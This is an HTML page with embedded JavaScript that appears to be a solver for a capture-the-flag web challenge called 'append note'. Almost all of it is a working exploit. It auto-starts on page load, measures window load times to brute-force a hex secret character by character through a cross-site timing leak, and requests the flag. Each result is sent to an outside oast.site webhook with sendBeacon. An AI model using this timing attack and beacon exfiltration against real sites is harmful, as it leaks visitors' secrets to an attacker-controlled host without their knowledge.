<!DOCTYPE html>
<html>
<head>
    <title>STARK ENT. - APPEND_NOTE_SOLVER v3</title>
    <style>
        body { background: #0d1117; color: #58a6ff; font-family: 'Fira Code', monospace; padding: 20px; }
        .log-entry { border-left: 2px solid #30363d; padding-left: 10px; margin: 5px 0; font-size: 13px; }
        .success { color: #3fb950; font-weight: bold; }
        .error { color: #f85149; }
    </style>
</head>
<body>
    <h2 id="status">INITIATING BRUTE FORCE...</h2>
    <div id="log"></div>
<script>
    const TARGET = "https://append-note-61jaz.instancer.lac.tf";
    const WEBHOOK = "https://bbote0qi0v6t4dwpqhu88dorcsdwsq0ju.oast.site";
    const CHARS = "0123456789abcdef";
    
    const log = (msg, cls="") => {
        const div = document.createElement("div");
        div.className = "log-entry " + cls;
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        document.getElementById("log").prepend(div);
    };
    
    const report = (data) => {
        navigator.sendBeacon(`${WEBHOOK}?${encodeURIComponent(JSON.stringify(data))}`);
    };
    
    // Use fetch with timing - more reliable than iframes
    async function probe(content) {
        const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
        
        return new Promise((resolve) => {
            const t0 = performance.now();
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            
            let resolved = false;
            
            // Use a short timeout to detect fast 200 responses
            const timer = setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    const elapsed = performance.now() - t0;
                    if (iframe.parentNode) {
                        document.body.removeChild(iframe);
                    }
                    resolve(elapsed);
                }
            }, 500);
            
            iframe.onload = iframe.onerror = () => {
                if (!resolved) {
                    resolved = true;
                    clearTimeout(timer);
                    const elapsed = performance.now() - t0;
                    if (iframe.parentNode) {
                        document.body.removeChild(iframe);
                    }
                    resolve(elapsed);
                }
            };
            
            document.body.appendChild(iframe);
            iframe.src = url;
        });
    }
    
    // Alternative: Use window.open with better detection
    async function probeWindow(content) {
        const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
        const t0 = performance.now();
        
        // Open in a new window with unique name
        const w = window.open(url, '_blank_' + Math.random());
        
        return new Promise((resolve) => {
            // Wait and measure
            setTimeout(() => {
                const elapsed = performance.now() - t0;
                try {
                    if (w && !w.closed) {
                        w.close();
                    }
                } catch(e) {}
                resolve(elapsed);
            }, 400);
        });
    }
    
    async function solve() {
        let secret = "";
        
        log("Starting attack with window-based timing...");
        report({status: "started", target: TARGET});
        
        // Simple baseline
        log("Measuring baseline...");
        const b1 = await probeWindow("XXXXX" + Math.random());
        await new Promise(r => setTimeout(r, 200));
        const b2 = await probeWindow("YYYYY" + Math.random());
        await new Promise(r => setTimeout(r, 200));
        const b3 = await probeWindow("ZZZZZ" + Math.random());
        const baseline = (b1 + b2 + b3) / 3;
        
        log(`Baseline: ${baseline.toFixed(1)}ms (samples: ${b1.toFixed(0)}, ${b2.toFixed(0)}, ${b3.toFixed(0)})`);
        
        for (let pos = 0; pos < 8; pos++) {
            log(`\n>>> Position ${pos + 1}/8 <<<`);
            
            let bestChar = '';
            let bestDelta = -999;
            let allResults = [];
            
            for (const c of CHARS) {
                const attempt = secret + c;
                
                // Take 2 measurements
                const t1 = await probeWindow(attempt);
                await new Promise(r => setTimeout(r, 150));
                const t2 = await probeWindow(attempt);
                await new Promise(r => setTimeout(r, 150));
                
                const avg = (t1 + t2) / 2;
                const delta = baseline - avg; // Positive = faster than baseline
                
                allResults.push({c, avg, delta, times: [t1, t2]});
                
                log(`  ${c}: ${avg.toFixed(1)}ms (Î”${delta >= 0 ? '+' : ''}${delta.toFixed(1)}) [${t1.toFixed(0)},${t2.toFixed(0)}]`);
                
                if (delta > bestDelta) {
                    bestDelta = delta;
                    bestChar = c;
                }
            }
            
            secret += bestChar;
            log(`âœ“ Position ${pos+1}: '${bestChar}' (Î”+${bestDelta.toFixed(1)}ms)`, "success");
            log(`  Current secret: ${secret}`, "success");
            
            report({
                pos: pos,
                char: bestChar,
                secret: secret,
                delta: bestDelta,
                all: allResults.map(r => `${r.c}:${r.delta.toFixed(0)}`)
            });
        }
        
        log(`\n=== FINAL SECRET: ${secret} ===`, "success");
        
        // Try to get flag
        setTimeout(async () => {
            try {
                log("Fetching flag...");
                const res = await fetch(`${TARGET}/flag?secret=${encodeURIComponent(secret)}`);
                const flag = await res.text();
                
                log(`Response: ${flag}`);
                
                if (flag.includes('lactf{')) {
                    log(`ðŸš© ${flag}`, "success");
                    document.getElementById("status").textContent = flag;
                    report({secret: secret, flag: flag, success: true});
                } else {
                    log(`Wrong secret. Trying variations...`, "error");
                    document.getElementById("status").textContent = `Failed: ${flag}`;
                    report({secret: secret, response: flag, success: false});
                }
            } catch(e) {
                log(`Error: ${e}`, "error");
                report({secret: secret, error: e.toString()});
            }
        }, 1000);
    }
    
    // Auto-start after a brief delay to ensure page is loaded
    setTimeout(solve, 500);
</script>
</body>
</html>
